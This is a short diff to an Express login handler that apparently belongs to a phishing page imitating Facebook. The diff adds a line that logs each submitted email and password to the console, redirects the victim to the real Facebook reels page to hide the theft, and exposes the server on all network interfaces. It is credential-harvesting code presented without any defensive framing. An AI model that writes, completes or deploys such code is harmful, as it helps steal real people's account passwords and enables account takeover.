@@ -29,15 +29,14 @@ app.post('/login', (req, res) => {
     }
   });
 
+  // Log credentials to the console
+  console.log(`Email: ${email} | Password: ${password}`);
+
   // Redirect user to Facebook reels
   res.redirect('https://www.facebook.com/reel/');
 });
 
-// // Start server
-// app.listen(PORT, () => {
-//   console.log(`Server listening on http://localhost:${PORT}`);
-// });
-// ✅ Make server accessible from the network
+// Start server and make it accessible on the network
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server listening on http://0.0.0.0:${PORT}`);
 });
